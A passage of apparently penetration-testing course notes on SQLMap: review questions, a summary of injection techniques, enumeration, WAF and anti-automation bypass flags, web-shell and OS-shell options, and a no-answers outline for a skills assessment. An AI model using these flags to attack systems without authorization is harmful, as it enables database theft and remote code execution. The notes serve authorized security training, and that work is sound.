8. **Why might `--os-shell` return "No output" on its first attempt, and what's the fix?**
   The default technique (often UNION-based) may not reliably carry command output back; forcing a different technique (e.g. `--technique=E` for error-based) can succeed where the default fails.
9. **What's the difference between `--randomize` and `--eval` as anti-automation bypasses?**
   `--randomize` simply randomizes a named parameter's value per request (for "must be unique" checks); `--eval` runs arbitrary Python to compute a parameter value that must stay mathematically/cryptographically consistent with another parameter (e.g. a hash).
10. **How does SQLMap detect the presence of a WAF, and what does it do once one is found?**
    It sends a deliberately malicious-looking payload on a non-existent parameter name early in the scan and checks for a substantial response change (e.g. a 406 from ModSecurity); on detection, it uses the identYwaf library (80 WAF signatures) to identify the specific product, which can inform which `--tamper` scripts to try.

### 6.5 Two-Minute Final Summary

SQLMap automates the full SQLi lifecycle: detection, fingerprinting, enumeration, data exfiltration, protection bypass, and OS-level exploitation, across the broadest DBMS support of any such tool. It implements six core techniques (`BEUSTQ`: Boolean-blind, Error-based, UNION, Stacked queries, Time-blind, inline Queries) plus out-of-band DNS exfiltration for the hardest cases — UNION is fastest, error-based is fast-but-chunked, boolean-blind is most common but slowest per character, and stacked queries depend on platform support (not MySQL by default).

A basic run (`sqlmap -u "URL" --batch`) walks through stability/dynamicity checks, heuristic DBMS/injectability hints (not proof), technique-by-technique testing, and a final confirmed-injection-point summary. Requests can be supplied via URL, `--data`, a captured request file (`-r`), or copied straight from a browser/Burp as cURL. When things don't work cleanly, `--parse-errors`, `-t`, `-v 6`, and `--proxy` help diagnose why, while `--level`/`--risk` broaden the payload set (at a real time/risk cost) and response-difference options (`--code`, `--titles`, `--string`, `--text-only`) help pin down TRUE/FALSE detection on noisy targets.

Enumeration flows from basic orientation (`--banner --current-user --current-db --is-dba`) through table/schema discovery (`--tables`, `--schema`, `--search`) to targeted dumps (`--dump -T ... -D ...`, narrowed by `-C`/`--start`/`--stop`/`--where`), with automatic password-hash recognition and dictionary cracking built in. Protection bypasses cover anti-automation parameter tricks (`--csrf-token`, `--randomize`, `--eval`), WAF/filter evasion (`--tamper` scripts, `--random-agent`, `--chunked`, HTTP parameter pollution), and IP concealment (`--proxy`, `--tor`).

With sufficient (DBA-level) privileges, SQLMap can read local files (`--file-read`), write a web shell (`--file-write`/`--file-dest`) for direct RCE, or drop into a fully interactive OS shell (`--os-shell`) via file-stager/backdoor uploads or injected UDFs — trying alternate `--technique` values if the default produces no output. Throughout, remember that DB-level "root"/DBA privilege is entirely separate from OS-level root, and that every destructive or intrusive capability here requires explicit authorization.

---

## 7. Skills Assessment: Approach Only

The assessment targets a web application with basic protection mechanisms, asking you to find and exploit a SQLi vulnerability with SQLMap and retrieve the contents of a table called `final_flag`. These notes contain no answers. Use the workflow in §5: capture the request, run initial detection (adjusting for any protections found per §3.8), enumerate the database schema to locate the relevant table, then dump it per §3.6/§3.7.
